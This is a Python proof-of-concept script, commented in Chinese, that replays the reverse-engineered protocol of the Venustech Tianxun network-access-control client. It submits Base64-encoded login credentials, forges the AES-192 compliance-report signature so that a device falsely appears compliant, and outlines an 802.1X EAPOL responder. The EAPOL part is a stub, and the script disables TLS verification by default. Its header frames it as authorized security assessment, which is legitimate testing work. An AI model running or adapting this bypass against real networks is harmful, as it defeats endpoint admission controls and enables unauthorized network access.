#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
启明星辰天珣 NAC 客户端协议复现 POC（安全评估用途）

用途：
    在树莓派/Linux 设备上复现 NACC.exe 的「登录 → 上报合规 → 模拟 802.1X 认证」协议链路，
    用于红队/采购前安全评估，验证「伪造合规终端能否通过 NAC 准入」。

法律与合规：
    仅限在【你拥有授权】的网络环境中，对本单位采购评估的 NAC 系统做安全测试。
    未经授权对第三方系统做此测试属违法行为。

逆向依据（来自 Ghidra 分析 NACC.exe）：
    1. 登录：POST /nac/user/auth/password
       - 参数：username + password(仅 Base64，非强加密) + terminal_type=windows 等
    2. 上报签名：AES-192 对称加密（密钥=pskey）+ Base64
       - 明文格式：sprintf("%s %s %d", sessionid, pskey, autologin_flag) + 32 空格填充
       - 上报：GET /nac/dev/check/helper?username=%s&value=%s
    3. 模拟 802.1X：客户端自己收发 EAP 报文（Receive EAP_SUCCESS），代答认证

重要说明：
    - 本脚本的「参数填充」部分（服务器地址、EAP 报文格式、TLS 证书校验方式）
      必须通过【抓包】在真实环境确认，静态逆向无法获得这些运行时值。
    - 详见同目录《抓包手册.md》。

依赖：
    pip install requests pycryptodome scapy
    （scapy 仅 EAPOL 模拟需要；纯 HTTP 部分只需 requests + pycryptodome）
"""

import base64
import os
import sys
import json

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


# ============================================================================
# 0. 配置区 —— 必须抓包/查注册表后填入真实值
# ============================================================================

CONFIG = {
    # 服务器地址候选列表：依次尝试，自动探测哪个能连通。
    # 两个来源：
    #   <FACTORY_DEFAULT_IP> —— 安装包 SetupFiles\Setup.ini 出厂默认值
    #   <NAC_SERVER_IP>   —— 用户口述（需实际环境确认）
    # 最终以已装客户端注册表 HKLM\SOFTWARE\NACC\ServerAddress 为准；
    # 这里列出候选，脚本会逐个测试连通性。
    "servers": [
        "https://<FACTORY_DEFAULT_IP>:443",
        "https://<NAC_SERVER_IP>:443",
    ],

    # 账号密码：优先从环境变量读取，避免明文硬编码进文件。
    #   export NAC_USERNAME=xxx
    #   export NAC_PASSWORD=xxx
    # 未设置环境变量时，退回下方的占位值（请勿把真实密码提交到代码库）。
    "username": os.environ.get("NAC_USERNAME", "REPLACE_WITH_USERNAME"),
    "password": os.environ.get("NAC_PASSWORD", "REPLACE_WITH_PASSWORD"),

    # 本机出口 IP（登录 realip / onlineaddrs 用），留空则自动采集
    "realip": os.environ.get("NAC_REALIP", ""),

    # autologin_flag（登录后写入注册表 HKLM\\SOFTWARE\\NACC\\autologin_flag）
    # 逆向明文格式 "%s %s %d" 的第三项，通常为 0 或 1。
    "autologin_flag": 0,

    # TLS 证书校验：
    #   True  = 严格校验服务器证书（需把服务器 CA 导入，见抓包手册）
    #   False = 跳过校验（仅用于抓包确认阶段，正式评估应设为 True 并加载 CA）
    "verify_tls": False,

    # CA 证书文件路径（verify_tls=True 时使用）
    "ca_cert": "REPLACE_WITH_CA_PATH.pem",
}


# ============================================================================
# 0.1 服务器地址探测：依次尝试候选地址，返回能连通的第一个
# ============================================================================

def probe_server() -> str:
    """
    依次探测 CONFIG["servers"] 里的候选地址，返回第一个能建立连接的。
    探测方式：向 /nac/user/auth/verifycode_status（轻量 GET）发请求，
    只要 TCP/TLS 层能连通即认为该地址可用（HTTP 状态码非连接错误即可）。
    """
    for server in CONFIG["servers"]:
        try:
            url = server + "/nac/user/auth/verifycode_status"
            r = requests.get(url, verify=CONFIG["verify_tls"], timeout=8)
            print(f"[probe] {server} → HTTP {r.status_code}（连通）")
            return server
        except requests.exceptions.SSLError as e:
            print(f"[probe] {server} → SSL 错误（{e.__class__.__name__}），"
                  f"说明端口可达但证书校验失败，可尝试 verify_tls=False")
            # 证书问题仍算「地址可达」，继续看下一个候选是否更合适
        except requests.exceptions.ConnectionError:
            print(f"[probe] {server} → 连接失败（不可达）")
        except Exception as e:
            print(f"[probe] {server} → 异常：{e.__class__.__name__}")
    return None


# ============================================================================
# 1. 登录认证：POST /nac/user/auth/password
# ============================================================================

def _encrypt_password(plain_password: str) -> str:
    """
    登录密码 = base64(明文)。
    【2026-10-12 抓包实测纠正】之前误判为 AES-128-CBC(key=1234567890abcdef)，
    那其实是客户端解密服务器下发配置（VSG_PWD）用的，与登录密码无关。
    抓包证据：前端提交 password=<NAC_PASSWORD_B64> == base64(明文)。
    """
    return base64.b64encode(plain_password.encode("utf-8")).decode("ascii")


def login(session: requests.Session, server: str) -> dict:
    """
    复现登录，返回服务器下发的会话凭据。
    响应 JSON 结构（已实测）：{"code","msg","result":{"sid_name":"VSG_SESSIONID"}}
    成功时通过 Set-Cookie 下发 VSG_SESSIONID。
    """
    url = server + "/nac/user/auth/password"

    # 登录密码 = base64(明文)
    password_enc = _encrypt_password(CONFIG["password"])

    # 参数（抓包 100% 还原）
    data = {
        "username": base64.b64encode(CONFIG["username"].encode("utf-8")).decode("ascii"),
        "password": password_enc,
        "verifycode": "",
        "challenge": "",
        "terminal": "",
        "rmbpwd_browser": "",
        "encode": "1",
        "type": "",
        "auto_login": "",
        "realip": CONFIG.get("realip", ""),
        "access_net_flag": "1",
        "terminal_type": "windows",
        "onlineaddrs": "g~3xxxi" + CONFIG.get("realip", ""),
    }

    resp = session.post(url, data=data, verify=CONFIG["verify_tls"], timeout=15)
    print(f"[login] HTTP {resp.status_code}")
    print(f"[login] body: {resp.text[:500]}")

    # TODO: 根据抓包确认响应里 sessionid/pskey 的字段名与结构。
    # 常见形态：JSON { "sessionid": "...", "pskey": "..." } 或 body 内嵌。
    # 这里先尝试 JSON，若失败则提示抓包。
    try:
        j = resp.json()
        cred = {
            "sessionid": j.get("sessionid") or j.get("VSG_SESSIONID"),
            "pskey": j.get("pskey") or j.get("pwdkey"),
        }
    except Exception:
        cred = {"sessionid": None, "pskey": None}
        print("[login] 响应非 JSON，请抓包确认 sessionid/pskey 字段位置")

    if not cred["sessionid"] or not cred["pskey"]:
        print("[login] 未能解析 sessionid/pskey —— 请按抓包手册确认字段名")
    return cred


# ============================================================================
# 2. 上报签名：AES-192(pskey) + Base64
# ============================================================================

def build_report_signature(sessionid: str, pskey: str, autologin_flag: int) -> str:
    """
    复现上报签名（逆向自 FUN_00504d50 AES-192 加密 + FUN_00505970 Base64）。
    明文 = sprintf("%s %s %d", sessionid, pskey, autologin_flag) + 32 空格填充。
    密钥 = pskey 本身（192 位 = 24 字节，AES_set_encrypt_key(key, 0xc0)）。
    """
    # 明文拼接 + 32 空格填充（对齐逆向 "%s %s %d" 格式）
    plaintext = "%s %s %d" % (sessionid, pskey, autologin_flag)
    plaintext = plaintext.ljust(len(plaintext) + 32, " ")

    # pskey 作为 AES-192 密钥：需 24 字节。
    # 注意：逆向里 pskey 是字符串，需确认它如何映射为 24 字节密钥
    # （可能是直接截断/补齐，或先做某种派生）。此处给两种常见处理。
    key = _derive_aes192_key(pskey)

    cipher = AES.new(key, AES.MODE_ECB)  # 逐 16 字节块加密，ECB（逆向为逐块 AES_encrypt）
    ct = cipher.encrypt(pad(plaintext.encode("utf-8"), 16))
    return base64.b64encode(ct).decode("ascii")


def _derive_aes192_key(pskey: str) -> bytes:
    """
    AES-192 密钥派生。逆向确认密钥=pskey(192位/24字节)，
    但 pskey 字符串→24字节的确切映射需抓包/实测确认。常见两种：
      (a) pskey 直接 UTF-8 字节截断/补齐到 24
      (b) pskey 是 hex 字符串，decode 成 24 字节
    默认用 (a)，如不匹配改这里。
    """
    b = pskey.encode("utf-8")
    if len(b) >= 24:
        return b[:24]
    # 不足 24 字节：右补零（需与服务器实现一致，否则验签失败）
    return b + b"\x00" * (24 - len(b))


def report_check(session: requests.Session, server: str, username: str, signature: str) -> None:
    """
    上报合规检查（复现 /nac/dev/check/helper?username=%s&value=%s）。
    """
    url = server + "/nac/dev/check/helper"
    params = {"username": username, "value": signature}
    resp = session.get(url, params=params, verify=CONFIG["verify_tls"], timeout=15)
    print(f"[report] HTTP {resp.status_code}")
    print(f"[report] body: {resp.text[:500]}")


# ============================================================================
# 3. 模拟 802.1X 认证（EAPOL 代答）
# ============================================================================

def simulate_eapol(iface: str):
    """
    模拟 802.1X 认证（复现 NACC.exe 的 Simulate 802dot1x auth / Receive EAP_SUCCESS）。

    原理：802.1X 认证是交换机(Authenticator) ↔ 终端(Supplicant) 的二层 EAPOL 交互。
    NACC.exe 在用户态自己收发 EAP 报文代答，最终收到 EAP_SUCCESS 即认证成功。

    此函数用 scapy 收发 EAPOL 帧。具体 EAP 方法(身份/挑战)与报文字段
    必须抓包确认（见抓包手册），此处给出骨架。
    """
    try:
        from scapy.all import (Ether, EAPOL, EAP, sendp, sniff)
    except ImportError:
        print("[eap] 需要安装 scapy: pip install scapy")
        return

    print(f"[eap] 在 {iface} 上模拟 802.1X 认证（需抓包确认 EAP 报文格式）")
    # TODO: 完整 EAPOL 状态机需抓包还原：
    #   EAPOL-Start → EAP-Request/Identity → EAP-Response/Identity
    #   → EAP-Request/MD5-Challenge(或 PEAP) → ... → EAP-Success
    # 此处仅为骨架，标注了待抓包填充的位置。
    print("[eap] 说明：EAP 报文字段需按抓包手册还原，骨架见 eapol_sim.py")


# ============================================================================
# 主流程
# ============================================================================

def main():
    print("=" * 60)
    print("NAC 客户端协议复现 POC（安全评估）")
    print("=" * 60)

    if CONFIG["username"].startswith("REPLACE") or CONFIG["password"].startswith("REPLACE"):
        print("[!] 请设置环境变量 NAC_USERNAME / NAC_PASSWORD，")
        print("    或按抓包手册填写账号密码后重试。")
        sys.exit(1)

    print("\n[0/3] 探测服务器地址...")
    server = probe_server()
    if server is None:
        print("[!] 所有候选服务器地址均不可达。")
        print("    请确认测试机与 NAC 服务器在同一内网，并核对注册表 ServerAddress。")
        sys.exit(1)
    print(f"[0/3] 使用服务器：{server}")

    s = requests.Session()

    print("\n[1/3] 登录认证...")
    cred = login(s, server)
    if not cred["sessionid"] or not cred["pskey"]:
        print("[!] 登录未取得完整凭据，请抓包确认字段，见抓包手册")
        # 仍继续演示签名逻辑（用占位值）
        sessionid = "PLACEHOLDER_SESSIONID"
        pskey = "PLACEHOLDER_PSKEY"
    else:
        sessionid, pskey = cred["sessionid"], cred["pskey"]

    print("\n[2/3] 生成上报签名并上报合规...")
    sig = build_report_signature(sessionid, pskey, CONFIG["autologin_flag"])
    print(f"[sig] signature = {sig[:64]}...")
    report_check(s, server, CONFIG["username"], sig)

    print("\n[3/3] 模拟 802.1X 认证（需真实网卡 + 抓包确认 EAP 格式）")
    # iface 需替换为直连交换机的网卡名，如 eth0
    # simulate_eapol("eth0")

    print("\n完成。若 HTTP 部分返回正常、且 EAPOL 抓包确认后，即完成协议复现验证。")


if __name__ == "__main__":
    main()
